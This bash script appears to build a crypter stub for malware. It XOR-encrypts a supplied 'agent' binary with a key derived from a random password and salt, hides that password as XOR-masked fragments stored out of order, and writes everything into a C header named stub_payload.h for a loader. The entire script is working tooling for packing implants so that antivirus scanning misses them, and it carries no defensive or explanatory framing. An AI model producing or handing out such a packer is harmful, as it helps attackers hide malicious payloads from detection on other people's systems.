set -e

if [ -z "$1" ]; then
    echo "Usage: $0 <agent_binary>"
    exit 1
fi

AGENT="$1"
[ ! -f "$AGENT" ] && echo "File not found: $AGENT" && exit 1

KEY_LEN=32
SALT_LEN=16
PASS_LEN=32
OUTFILE="stub_payload.h"
SIZE=$(stat -c%s "$AGENT")

PASS_HEX=$(head -c $PASS_LEN /dev/urandom | xxd -p -c 256)
SALT_HEX=$(head -c $SALT_LEN /dev/urandom | xxd -p -c 256)

KEY_HEX=$(python3 -c "
pass_bytes = bytes.fromhex('$PASS_HEX')
salt_bytes = bytes.fromhex('$SALT_HEX')

state = 0xCBF29CE484222325
for b in pass_bytes:
    state ^= b
    state = (state * 0x100000001B3) & 0xFFFFFFFFFFFFFFFF
for b in salt_bytes:
    state ^= b
    state = (state * 0x100000001B3) & 0xFFFFFFFFFFFFFFFF

key = bytearray()
for _ in range($KEY_LEN):
    state ^= (state << 13) & 0xFFFFFFFFFFFFFFFF
    state ^= (state >> 7)
    state ^= (state << 17) & 0xFFFFFFFFFFFFFFFF
    state &= 0xFFFFFFFFFFFFFFFF
    key.append(state & 0xFF)

print(key.hex())
")

python3 -c "
key = bytes.fromhex('$KEY_HEX')
with open('$AGENT', 'rb') as f:
    data = f.read()

enc = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

with open('.stub_enc.bin', 'wb') as f:
    f.write(enc)
"

PASS_OBF_HEX=$(python3 -c "
pass_bytes = bytearray(bytes.fromhex('$PASS_HEX'))

for i in range(len(pass_bytes)):
    pass_bytes[i] ^= (0x37 + i * 13) & 0xFF

frags = [bytes(pass_bytes[i*8:(i+1)*8]) for i in range(4)]

order = [2, 0, 3, 1]
for idx in order:
    print(frags[idx].hex())
")

FRAG0=$(echo "$PASS_OBF_HEX" | sed -n '1p')
FRAG1=$(echo "$PASS_OBF_HEX" | sed -n '2p')
FRAG2=$(echo "$PASS_OBF_HEX" | sed -n '3p')
FRAG3=$(echo "$PASS_OBF_HEX" | sed -n '4p')

echo "/* stub_payload.h — Auto-generated. Do not edit. */" > "$OUTFILE"
echo "/* Agent: $AGENT ($SIZE bytes, encrypted with derived key) */" >> "$OUTFILE"
echo "" >> "$OUTFILE"

echo "#define STUB_KEY_LEN  ${KEY_LEN}"  >> "$OUTFILE"
echo "#define STUB_SALT_LEN ${SALT_LEN}" >> "$OUTFILE"
echo "#define STUB_PASS_LEN ${PASS_LEN}" >> "$OUTFILE"
echo "" >> "$OUTFILE"

echo -n "static const unsigned char stub_salt[${SALT_LEN}] = {" >> "$OUTFILE"
for ((i=0; i<${#SALT_HEX}; i+=2)); do
    [ $i -gt 0 ] && echo -n "," >> "$OUTFILE"
    echo -n "0x${SALT_HEX:$i:2}" >> "$OUTFILE"
done
echo "};" >> "$OUTFILE"
echo "" >> "$OUTFILE"

emit_frag() {
    local name="$1"
    local hex="$2"
    echo -n "static const unsigned char ${name}[8] = {" >> "$OUTFILE"
    for ((i=0; i<${#hex}; i+=2)); do
        [ $i -gt 0 ] && echo -n "," >> "$OUTFILE"
        echo -n "0x${hex:$i:2}" >> "$OUTFILE"
    done
    echo "};" >> "$OUTFILE"
}

emit_frag "stub_pass_frag0" "$FRAG0"
emit_frag "stub_pass_frag1" "$FRAG1"
emit_frag "stub_pass_frag2" "$FRAG2"
emit_frag "stub_pass_frag3" "$FRAG3"
echo "" >> "$OUTFILE"

xxd -i .stub_enc.bin >> "$OUTFILE"
sed -i 's/unsigned char .*\[\]/static unsigned char stub_payload[]/' "$OUTFILE"
sed -i 's/unsigned int .*_len/static unsigned int stub_payload_len/' "$OUTFILE"

rm -f .stub_enc.bin
